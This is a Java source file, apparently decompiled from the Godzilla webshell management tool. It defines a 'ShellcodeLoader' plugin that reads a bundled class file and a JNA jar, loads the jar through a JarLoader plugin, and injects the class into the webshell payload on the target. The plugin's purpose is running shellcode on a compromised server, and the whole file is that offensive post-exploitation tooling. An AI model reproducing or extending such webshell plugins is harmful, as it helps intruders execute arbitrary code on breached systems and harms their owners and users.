package shells.plugins.java;

import core.annotation.PluginAnnotation;
import core.ui.ShellManage;
import core.ui.component.dialog.GOptionPane;
import java.io.InputStream;
import util.Log;
import util.functions;

@PluginAnnotation(
   payloadName = "JavaDynamicPayload",
   Name = "ShellcodeLoader",
   DisplayName = "ShellcodeLoader"
)
public class ShellcodeLoader extends shells.plugins.generic.ShellcodeLoader {
   private static final String CLASS_NAME = "plugin.ShellcodeLoader";
   private JarLoader jarLoader;

   private boolean loadJar(byte[] jar) {
      if (this.jarLoader == null) {
         try {
            if (this.jarLoader == null) {
               ShellManage shellManage = this.shellEntity.getFrame();
               this.jarLoader = (JarLoader)shellManage.getPlugin("JarLoader");
            }
         } catch (Exception var3) {
            GOptionPane.showMessageDialog(this.shellEntity.getFrame(), "no find plugin JarLoader!");
            return false;
         }
      }

      return this.jarLoader.loadJar(jar);
   }

   public boolean load() {
      if (!this.loadState) {
         try {
            InputStream inputStream = this.getClass().getResourceAsStream("assets/ShellcodeLoader.classs");
            byte[] data = functions.readInputStream(inputStream);
            inputStream.close();
            inputStream = this.getClass().getResourceAsStream("assets/GodzillaJna.jar");
            byte[] jar = functions.readInputStream(inputStream);
            inputStream.close();
            if (this.loadJar(jar)) {
               Log.log(String.format("LoadJar : %s", true));
               this.loadState = this.payload.include("plugin.ShellcodeLoader", data);
            }
         } catch (Exception var4) {
            Log.error((Throwable)var4);
            GOptionPane.showMessageDialog(this.panel, var4.getMessage(), "提示", 2);
         }
      }

      return this.loadState;
   }

   public String getClassName() {
      return "plugin.ShellcodeLoader";
   }
}
